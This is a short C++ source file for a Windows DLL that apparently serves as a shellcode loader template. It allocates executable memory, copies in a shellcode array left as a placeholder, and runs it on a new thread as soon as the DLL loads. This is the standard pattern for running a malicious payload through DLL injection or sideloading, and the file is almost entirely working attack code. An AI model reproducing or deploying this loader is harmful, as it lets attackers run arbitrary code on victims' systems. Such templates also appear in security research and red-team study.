#include <windows.h>
#include <string.h>

unsigned char shellcode[] = {
SHELLCODE_PLACEHOLDER
};

extern "C" __declspec(dllexport) void RunMe(LPCWSTR dummy) {
    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec) {
        memcpy(exec, shellcode, sizeof(shellcode));
        ((void(*)())exec)();
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RunMe, 0, 0, 0);
    }
    return TRUE;
}